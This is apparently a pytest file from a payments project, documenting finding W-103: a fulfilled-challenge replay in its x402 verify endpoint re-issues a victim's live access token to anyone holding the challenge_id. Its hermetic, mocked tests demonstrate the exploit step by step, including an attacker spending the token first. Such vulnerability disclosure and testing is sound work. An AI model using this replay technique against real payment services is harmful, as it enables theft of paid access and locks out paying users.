"""W-103 (NEW, VERIFIED): x402 fulfilled-challenge replay re-mints the live
entitlement token to anyone who knows the challenge_id — bypassing the
W-102 round-2 binding guard.

Vulnerability
-------------
``verify_challenge`` (src/sincor2/x402_payments.py) returns early for a
fulfilled challenge::

    if row["status"] == "fulfilled":
        return {"ok": True, "status": "already_fulfilled",
                "access_token": row["access_token"], ...}

This branch runs BEFORE the payer-binding check and BEFORE the
``require_bound_challenge`` gate that W-102 round 2 added. On this path:
  * the supplied tx_hash is not compared to the recorded one,
  * the supplied payer_wallet is not compared to the recorded payer,
  * a blank-recorded challenge is NOT rejected with challenge_unbound.
Knowledge of the challenge_id alone re-issues the live, unconsumed,
unexpired access_token. Tokens are single-use at the serve path
(``access_granted`` stamps ``token_consumed_at``), so whoever replays
first spends the victim's paid entitlement; the victim's later serve
attempt fails — paid, but locked out.

Precondition: attacker learns the challenge_id. It is a 64-bit random
value (not enumerable), but it is echoed in every verify response and
can appear in logs/proxies. This is the same "bearer challenge_id"
class W-102 round 2 closed for the *claim* path; the *replay* path was
left open. Break attempt #17 against the round-2 fix: the
``require_bound_challenge=True`` guard never executes for fulfilled
challenges.

Severity: Medium. Precondition is non-trivial (challenge_id secrecy),
but the impact is theft of a paid entitlement plus denial of the
victim's paid access, with zero authentication on the replay.

Status: VERIFIED-OPEN (deferred). The correct fix needs a design call:
authenticate the replayer (e.g. EIP-191 signature from the recorded
payer wallet) vs. dropping token re-issue entirely (which would strand
legitimate clients that lost the first verify response and force a
double payment). Not changed unilaterally overnight.

Exploit demonstrated below (hermetic: tmp DB/data dir/ledger, mocked RPC):
  1. Victim creates a payer-bound challenge, pays (mocked), verifies ->
     receives live token T (not yet consumed).
  2. Attacker, knowing only the challenge_id, replays
     POST /api/x402/verify with THEIR OWN wallet and a junk tx_hash ->
     receives the SAME live token T.
  3. Attacker spends T at /api/paid/agent_task -> 200, token consumed.
  4. Victim spends T at /api/paid/agent_task -> DENIED (already consumed).
"""
from __future__ import annotations

import pytest
from flask import Flask

# Production import order: mvp_app first so _bind_mvp() binds X402_AVAILABLE.
import sincor2.mvp_app  # noqa: F401  (imported for binding side effects)
from sincor2.mvp_blueprints import billing

import sincor2.treasury_inflow as inflow_mod
import sincor2.x402_payments as x402

VICTIM = "0x" + "ab" * 20
ATTACKER = "0x" + "cd" * 20


def _tx(seed: str = "cc") -> str:
    return "0x" + seed * 32


@pytest.fixture()
def hermetic(tmp_path, monkeypatch):
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    monkeypatch.setenv("SINCOR_DATA_DIR", str(data_dir))
    monkeypatch.setenv("ORDERS_DB_PATH", str(tmp_path / "orders.db"))
    monkeypatch.setattr(inflow_mod, "_LEDGER_PATH", tmp_path / "inflow.jsonl")
    x402.init_x402_db()

    def _ok(tx_hash, **kwargs):
        # On-chain: the treasury transfer really came from VICTIM.
        return {"ok": True, "payer_wallet": VICTIM}

    monkeypatch.setattr(x402, "verify_treasury_transfer", _ok)

    app = Flask(__name__)
    app.register_blueprint(billing.bp)
    app.config.update(TESTING=True)
    return app.test_client()


def _verify(client, challenge_id, tx_hash, wallet):
    return client.post(
        "/api/x402/verify",
        json={"challenge_id": challenge_id, "tx_hash": tx_hash,
              "payer_wallet": wallet},
    )


class TestFulfilledReplayReissuesToken:
    def test_replay_hands_attacker_the_live_token(self, hermetic):
        client = hermetic
        tx = _tx()

        # 1. Victim's legitimate flow: bound challenge, real payment, verify.
        ch = x402.create_challenge("agent_task", payer_wallet=VICTIM)
        cid = ch["challenge_id"]
        r1 = _verify(client, cid, tx, VICTIM)
        assert r1.status_code == 200
        body1 = r1.get_json()
        assert body1["status"] == "fulfilled"
        victim_token = body1["access_token"]
        assert victim_token

        # 2. Attacker knows ONLY the challenge_id. Replays with their own
        #    wallet and a junk tx_hash (never went on-chain).
        junk_tx = _tx("ee")
        r2 = _verify(client, cid, junk_tx, ATTACKER)
        assert r2.status_code == 200, r2.get_json()
        body2 = r2.get_json()
        assert body2["status"] == "already_fulfilled"

        # EXPLOIT: the replay re-issued the victim's LIVE entitlement token
        # with no payer/tx/binding check of any kind.
        assert body2["access_token"] == victim_token, (
            "expected the replay to re-mint the live token (vulnerability "
            "demonstration)")

    def test_attacker_spends_first_victim_locked_out(self, hermetic):
        client = hermetic
        tx = _tx("ff")

        ch = x402.create_challenge("agent_task", payer_wallet=VICTIM)
        cid = ch["challenge_id"]
        r1 = _verify(client, cid, tx, VICTIM)
        token = r1.get_json()["access_token"]

        # Attacker replays, gets the same token, spends it FIRST.
        r2 = _verify(client, cid, _tx("11"), ATTACKER)
        stolen = r2.get_json()["access_token"]
        assert stolen == token
        spend_attacker = client.get(f"/api/paid/agent_task?access_token={stolen}")
        assert spend_attacker.status_code == 200, spend_attacker.get_json()

        # Victim, who actually paid, is now locked out of their purchase.
        spend_victim = client.get(f"/api/paid/agent_task?access_token={token}")
        assert spend_victim.status_code != 200, (
            "victim should be locked out after the attacker consumed the "
            "re-issued token (vulnerability demonstration)")
